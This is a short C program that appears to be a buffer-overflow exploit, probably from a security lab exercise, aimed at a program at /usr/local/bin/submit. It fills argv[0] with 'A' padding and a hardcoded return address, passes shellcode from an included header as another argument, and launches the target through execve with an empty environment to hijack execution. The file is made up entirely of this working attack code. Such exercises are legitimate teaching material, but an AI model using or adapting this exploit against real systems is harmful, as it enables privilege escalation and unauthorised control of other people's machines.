#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode.h"

#define COMMAND "/usr/local/bin/submit"

int main(void) {
  char *args[4], *env[1];
  int i, load_size;

  load_size = 210 + 1 - strlen("Syntax:\n\t") + 4 + 1;

  args[0] = (char *) malloc(load_size + strlen(shellcode) + 1);
  for (i = 0; i < load_size; ++i) {
    sprintf(args[0] + i, "%c", 'A');
  }
  sprintf(args[0] + i, "%c%c%c%c", 0xb8, 0xdf, 0xbf, 0xff);

  args[1] = "-h";
  args[2] = shellcode;  // shellcode at 0xffbfdfb8
  args[3] = NULL;

  env[0] = NULL;

  return execve(COMMAND, args, env);
}
